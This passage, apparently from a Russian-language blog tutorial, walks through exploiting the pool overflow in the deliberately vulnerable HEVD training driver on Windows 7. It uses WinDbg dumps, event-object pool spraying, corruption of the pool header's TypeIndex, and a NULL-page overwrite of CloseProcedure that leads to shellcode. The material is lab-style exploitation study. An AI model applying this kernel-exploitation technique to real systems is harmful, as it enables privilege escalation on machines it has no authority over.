<span class="o">*</span><span class="mi">850</span><span class="nx">b4618</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">5</span><span class="nf">d8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="nx">Hack</span>
    <span class="nx">Owning</span> <span class="nx">component</span> <span class="p">:</span> <span class="nc">Unknown </span><span class="p">(</span><span class="nx">update</span> <span class="nx">pooltag</span><span class="p">.</span><span class="nx">txt</span><span class="p">)</span>
<span class="nx">ReadVirtual</span><span class="p">:</span> <span class="mi">850</span><span class="nx">b4914</span> <span class="nx">not</span> <span class="nx">properly</span> <span class="nx">sign</span> <span class="nx">extended</span>
 <span class="mi">850</span><span class="nx">b4818</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">100</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Io</span>   <span class="nx">Process</span><span class="p">:</span> <span class="mi">86</span><span class="nx">db7030</span>
 <span class="mi">850</span><span class="nx">b4918</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">a8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">100</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">MmWe</span>
<span class="nx">ReadVirtual</span><span class="p">:</span> <span class="mi">850</span><span class="nx">b4afc</span> <span class="nx">not</span> <span class="nx">properly</span> <span class="nx">sign</span> <span class="nx">extended</span>
 <span class="mi">850</span><span class="nx">b49c0</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">140</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">a8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Io</span>   <span class="nx">Process</span><span class="p">:</span> <span class="mi">86</span><span class="nx">db7030</span>
<span class="nx">ReadVirtual</span><span class="p">:</span> <span class="mi">850</span><span class="nx">b4bfc</span> <span class="nx">not</span> <span class="nx">properly</span> <span class="nx">sign</span> <span class="nx">extended</span>
 <span class="mi">850</span><span class="nx">b4b00</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">100</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">140</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">Io</span>   <span class="nx">Process</span><span class="p">:</span> <span class="mi">86</span><span class="nx">db7030</span>
 <span class="mi">850</span><span class="nx">b4c00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">100</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4c40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4c80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4cc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4d00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4d40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4d80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4dc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4e00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4e40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4e80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4ec0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4f00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4f40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4f80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4fc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
</code></pre></div></div>

<p>Наши объекты событий заспреены в невыгружаемом пуле. Теперь нам нужно создать дыры и реаллокейтнуть наш уязвимый буфер Hack в созданные дыры. После реаллоцирования нашего уязвимого буфера нам нужно покорраптить хедер соседнего пула так, чтобы он вел к нашему шеллкоду. Размер объекта события будет 0x40 (0x38 + 0x8), включая заголовок пула</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pool</span> <span class="mh">0x850B4620</span>
<span class="nx">Pool</span> <span class="nx">page</span> <span class="mi">850</span><span class="nx">b4620</span> <span class="nx">region</span> <span class="nx">is</span> <span class="nx">Unknown</span>
 <span class="mi">850</span><span class="nx">b4000</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4040</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">pter</span>
 <span class="mi">850</span><span class="nx">b4068</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">XSav</span>
 <span class="mi">850</span><span class="nx">b43f0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">Ussb</span> <span class="nx">Process</span><span class="p">:</span> <span class="mi">86</span><span class="nx">db7030</span>
 <span class="mi">850</span><span class="nx">b4430</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">140</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Io</span>   <span class="nx">Process</span><span class="p">:</span> <span class="mi">86</span><span class="nx">db7030</span>
 <span class="mi">850</span><span class="nx">b4570</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">a8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">140</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">MmWe</span>
<span class="o">*</span><span class="mi">850</span><span class="nx">b4618</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">a8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="nx">Hack</span>
    <span class="nx">Owning</span> <span class="nx">component</span> <span class="p">:</span> <span class="nc">Unknown </span><span class="p">(</span><span class="nx">update</span> <span class="nx">pooltag</span><span class="p">.</span><span class="nx">txt</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4818</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">60</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">Io</span>  
 <span class="mi">850</span><span class="nx">b4878</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">60</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">XSav</span>
 <span class="mi">850</span><span class="nx">b4c00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4c40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>


<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dt</span> <span class="nx">_POOL_HEADER</span> <span class="mi">850</span><span class="nx">b4618</span>
<span class="nx">nt</span><span class="o">!</span><span class="nx">_POOL_HEADER</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">PreviousSize</span>     <span class="p">:</span> <span class="mi">0</span><span class="nf">y000010101 </span><span class="p">(</span><span class="mh">0x15</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">PoolIndex</span>        <span class="p">:</span> <span class="mi">0</span><span class="nf">y0000000 </span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="nx">BlockSize</span>        <span class="p">:</span> <span class="mi">0</span><span class="nf">y001000000 </span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="nx">PoolType</span>         <span class="p">:</span> <span class="mi">0</span><span class="nf">y0000010 </span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Ulong1</span>           <span class="p">:</span> <span class="mh">0x4400015</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="nx">PoolTag</span>          <span class="p">:</span> <span class="mh">0x6b636148</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="nx">AllocatorBackTraceIndex</span> <span class="p">:</span> <span class="mh">0x6148</span>
   <span class="o">+</span><span class="mh">0x006</span> <span class="nx">PoolTagHash</span>      <span class="p">:</span> <span class="mh">0x6b63</span>

</code></pre></div></div>

<p>Разберём хедеры:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; g
[+] Allocating Pool chunk
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x1F8
[+] Pool Chunk: 0x8524D4C8
[+] UserBuffer: 0x00098908
[+] UserBuffer Size: 0x1F8
[+] KernelBuffer: 0x8524D4C8
[+] KernelBuffer Size: 0x1F8
[+] Triggering Pool Overflow
Break instruction exception - code 80000003 (first chance)
HEVD!TriggerPoolOverflow+0xd8:
a855a202 ff750c          push    dword ptr [ebp+0Ch]

kd&gt; !pool 0x8524D4C8
Pool page 8524d4c8 region is Unknown
 8524d000 size:   40 previous size:    0  (Allocated)  Even (Protected)
 8524d040 size:   f8 previous size:   40  (Free)       r...
 8524d138 size:  388 previous size:   f8  (Free )  XSav
*8524d4c0 size:  200 previous size:  388  (Allocated) *Hack
        Owning component : Unknown (update pooltag.txt)
ReadVirtual: 8524d7fc not properly sign extended
 8524d6c0 size:  140 previous size:  200  (Allocated)  Io   Process: 86d7e228
 8524d800 size:   40 previous size:  140  (Allocated)  Even (Protected)
 8524d840 size:   40 previous size:   40  (Allocated)  Even (Protected)
 8524d880 size:   40 previous size:   40  (Allocated)  Even (Protected)
 8524d8c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
 8524d900 size:   40 previous size:   40  (Allocated)  Even (Protected)
 8524d940 size:   40 previous size:   40  (Allocated)  Even (Protected)
 8524d980 size:   40 previous size:   40  (Allocated)  Even (Protected)

kd&gt; dd 8524d6c0-8
ReadVirtual: 8524d6b8 not properly sign extended
8524d6b8  41414141 41414141 14280040 20206f49
8524d6c8  00320033 0063005c 00720065 00700074
8524d6d8  006f0072 002e0070 006c0064 0000006c
8524d6e8  c0100002 0424007e 95d23b8f 00000000
8524d6f8  1c210007 20206f49 00000000 00630069
8524d708  005c0065 00610048 00640072 00690064
8524d718  006b0073 006f0056 0075006c 0065006d
8524d728  005c0031 00690057 0064006e 0077006f
</code></pre></div></div>

<p>Так как мы спреим невыгружаемый пул с помощью объектов событий, мы можем просто добавить наши значения в конец нашего уязвимого буфера. Но это не сработает, так как хедеры имеют внутреннюю структуру, нужна некоторая модификация. Давайте копнём глубже в хедеры, чтобы понять, что модифицировать:</p>

<p><img src="/assets/post_images/8.png" alt="Pool" /></p>

<p>Вещь, которая нас интересует, это TypeIndex, который на самом деле оффсет (0xC) в массиве указателей, который объявляет OBJECT_TYPE каждого объекта, который поддерживает Windows.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; dd nt!ObTypeIndexTable
8277aee0  00000000 bad0b0b0 84ec7860 84ec7798
8277aef0  84ec76d0 84ec74a0 84ec7360 84ec7298
8277af00  84ec71d0 84ecef78 84eceeb0 84ece818       84ec71d0 - оффсет 0xC
8277af10  84f60418 84f60350 84f61418 84f61350
8277af20  84f5f3f0 84f5f328 84f629b8 84f628f0
8277af30  84f62828 84f62760 84f62698 84f625d0
8277af40  84f62508 84f62440 84f62378 84f63040
8277af50  84f63f78 84f63bd8 84f63b10 84f63a48

kd&gt; dt nt!_OBJECT_TYPE 84f60418 .
   +0x000 TypeList         :  [ 0x84f60418 - 0x84f60418 ]
      +0x000 Flink            : 0x84f60418 _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ]
      +0x004 Blink            : 0x84f60418 _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ]
   +0x008 Name             :  "Event"
      +0x000 Length           : 0xa
      +0x002 MaximumLength    : 0xc
      +0x004 Buffer           : 0x8cc08a88  "Event"
   +0x010 DefaultObject    : 
   +0x014 Index            : 0xc ''
   +0x018 TotalNumberOfObjects : 0x4643
   +0x01c TotalNumberOfHandles : 0x466f
   +0x020 HighWaterNumberOfObjects : 0x4643
   +0x024 HighWaterNumberOfHandles : 0x466f
   +0x028 TypeInfo         : 
      +0x000 Length           : 0x50
      +0x002 ObjectTypeFlags  : 0 ''
      +0x002 CaseInsensitive  : 0y0
      +0x002 UnnamedObjectsOnly : 0y0
      +0x002 UseDefaultObject : 0y0
      +0x002 SecurityRequired : 0y0
      +0x002 MaintainHandleCount : 0y0
      +0x002 MaintainTypeList : 0y0
      +0x002 SupportsObjectCallbacks : 0y0
      +0x002 CacheAligned     : 0y0
      +0x004 ObjectTypeCode   : 2
      +0x008 InvalidAttributes : 0x100
      +0x00c GenericMapping   : _GENERIC_MAPPING
      +0x01c ValidAccessMask  : 0x1f0003
      +0x020 RetainAccess     : 0
      +0x024 PoolType         : 0 ( NonPagedPool )
      +0x028 DefaultPagedPoolCharge : 0
      +0x02c DefaultNonPagedPoolCharge : 0x40
      +0x030 DumpProcedure    : (null) 
      +0x034 OpenProcedure    : (null) 
      +0x038 CloseProcedure   : (null) 
</code></pre></div></div>

<p>Важные моменты:</p>
<ul>
  <li>Первый указатель 00000000 очень важен, так как мы на Windows 7 (объяснение дальше)</li>
  <li>Следующий выделенный указатель 84f60418, который по оффсету 0xC от начала</li>
  <li>Анализируя, мы понимаем, что это объект типа Event</li>
  <li>Теперь самое интеерсное: член TypeInfo по оффсету 0x28</li>
  <li>
    <ul>
      <li>В конце этого члена есть вызовы нескольких процедур, можем использовать удобную из предоставленных. Будем импользовать CloseProcedure, находящуюся по 0x38</li>
    </ul>
  </li>
  <li>
    <ul>
      <li>Оффсет на CloseProcedure становится 0x28 + 0x38 = 0x60</li>
    </ul>
  </li>
  <li>
    <ul>
      <li>0x60 - это указатель, который мы будем переписывать указателем на шеллкод и затем вызывать метод CloseProcedure</li>
    </ul>
  </li>
</ul>

<p>Наша цель - изменить оффсет TypeIndex с 0xc на 0x0, поскольку первый указатель является нулевым, а в Windows 7 существует недостаток, при котором возможно отображение NULL-страниц с помощью вызова NtAllocateVirtualMemory</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">NTSTATUS</span> <span class="nf">ZwAllocateVirtualMemory</span><span class="p">(</span>
  <span class="n">_In_</span>    <span class="n">HANDLE</span>    <span class="n">ProcessHandle</span><span class="p">,</span>
  <span class="n">_Inout_</span> <span class="n">PVOID</span>     <span class="o">*</span><span class="n">BaseAddress</span><span class="p">,</span>
  <span class="n">_In_</span>    <span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
  <span class="n">_Inout_</span> <span class="n">PSIZE_T</span>   <span class="n">RegionSize</span><span class="p">,</span>
  <span class="n">_In_</span>    <span class="n">ULONG</span>     <span class="n">AllocationType</span><span class="p">,</span>
  <span class="n">_In_</span>    <span class="n">ULONG</span>     <span class="n">Protect</span>
<span class="p">);</span>
</code></pre></div></div>

<p>И затем пишем указатель на наш шеллкод в нужную локацию (0x60), используя вызов WriteProcessMemory</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span>
  <span class="n">_In_</span>  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span>
  <span class="n">_In_</span>  <span class="n">LPVOID</span>  <span class="n">lpBaseAddress</span><span class="p">,</span>
  <span class="n">_In_</span>  <span class="n">LPCVOID</span> <span class="n">lpBuffer</span><span class="p">,</span>
  <span class="n">_In_</span>  <span class="n">SIZE_T</span>  <span class="n">nSize</span><span class="p">,</span>
  <span class="n">_Out_</span> <span class="n">SIZE_T</span>  <span class="o">*</span><span class="n">lpNumberOfBytesWritten</span>
<span class="p">);</span>
</code></pre></div></div>
<h2 id="-ещё-одно-объяснение-из-следующей-статьи"><a href="#header-2"></a> Ещё одно объяснение из следующей статьи</h2>
<p>(дальше делал по коду из второго мануала, TODO: переделать, убрать векторы)</p>

<h3 id="общая-идея-атаки"><a href="#header-3"></a>Общая идея атаки</h3>

<p>Что у нас есть сейчас? - возможность перезаписать память пула. Чтобы получить из этого выгоду, нам нужно найти способ поменять состояние пула на предсказуемое нами. Если мы повредим поля, мы улетим в БСОД.</p>

<p>В целом, невыгружаемый пул фрагментирован, что значит, что в нём есть дыры из чанков, которые были освобождены другими процессами системы. Нам нужно заполнить эти дыры спрея кучу объектов в невыгружаемый пул так, что механизм аллокации положит наши чанки в эти пустые слоты. Как только это получится, нам нужно ещё заспреить объектов, чтобы самые частые(?) объекты в пуле были нашими.</p>

<p>Приводя аналогию,</p>

<p>В качестве аналогии, если бы у нас был мешок с фигурами из шахматного набора, у нас было бы мало шансов вытащить из него короля; однако, если мы добавим в мешок 15 000 королей, наши шансы значительно возрастут!</p>

<p>И так, две цели:</p>
<ul>
  <li>заспреить пул объектами, пока органически существующие в пуле дыри не заполнятся нашими объектами</li>
  <li>заспреить пул снова, чтобы увеличить количество объектов, которые мы аллоцировали, чтобы они были последовательными в невыгружаемом пуле</li>
</ul>

<p>Далее взять наши аллокации, которые образовали большой цельный блок, и проделаем в них дырки размеров с наш ядерный буфер, который мы можем аллоцировать с помощью функций драйвера. Наш ядерный буфер размером 0x200. Таким образом, когда наш буфер аллоцирован, аллокатор положит его по освобождённой 0x200 дыре, которую мы только что создали. Теперь наша аллокация(буфер) полностью окружена объектами, которые мы сами заспреили. Это прекрасно, потому что теперь, когда наш буфер переполняет соседней аллокации пула, мы будем знать, что конкретно мы перезаписываем, потому что это будет чанк, который мы сами и аллоцировали</p>

<p>Мы будем использовать эту возможность перезаписи данных, чтобы предсказуемо перезаписать часть данных в одном из наших аллоцированных объектов, который, после освобождения, закончится тем, что ядро выполнит указатель функции, который мы заполним шеллкодом. Теперь план такой:</p>
<ul>
  <li>спреим пул объектами, пока все органические дырки не будут заполнены нашими объектами</li>
  <li>спреим пул снова…</li>
  <li>делаем 0x200 дыры в аллокациях</li>
  <li>используем функции драйвера, чтобы заполнить нашим ядерным буфером новые дыры</li>
  <li>чтобы это распределение предсказуемо перезаписало информацию в соседней аллокации, что приведет к выполнению ядром нашего шеллкода, когда поврежденная аллокация будет освобождена</li>
</ul>

<h2 id="event-objects"><a href="#header-2"></a>Event objects</h2>

<p>Автор блога информирует нас, что <a href="https://learn.microsoft.com/en-us/windows/win32/sync/event-objects">Event Object</a> идеальны для этой задачи, потому что их размер 0x40. Мы можем освободить 8 Event Objects и получить наши дырки размером 0x200 байт.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x200</span> <span class="o">%</span> <span class="mh">0x40</span>
<span class="mi">0</span>
<span class="o">&gt;&gt;&gt;</span> <span class="mh">0x200</span> <span class="o">/</span> <span class="mh">0x40</span>
<span class="mf">8.0</span>
</code></pre></div></div>

<p>На параметры нам всё равно, так что будем вызывать CreateEventA с нулями</p>

<p>Что мы видим? Что наш чанк hack посередине аллоцированных CreateEvent’ом:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pool</span> <span class="mh">0x8513C8C8</span>
<span class="nx">Pool</span> <span class="nx">page</span> <span class="mi">8513</span><span class="nx">c8c8</span> <span class="nx">region</span> <span class="nx">is</span> <span class="nx">Unknown</span>
 <span class="mi">8513</span><span class="nx">c000</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">XSav</span>
 <span class="mi">8513</span><span class="nx">c388</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">438</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="p">....</span>
 <span class="mi">8513</span><span class="nx">c7c0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">438</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">c800</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">c840</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">c880</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
<span class="o">*</span><span class="mi">8513</span><span class="nx">c8c0</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="nx">Hack</span>
        <span class="nx">Owning</span> <span class="nx">component</span> <span class="p">:</span> <span class="nc">Unknown </span><span class="p">(</span><span class="nx">update</span> <span class="nx">pooltag</span><span class="p">.</span><span class="nx">txt</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cac0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cb00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cb40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cb80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
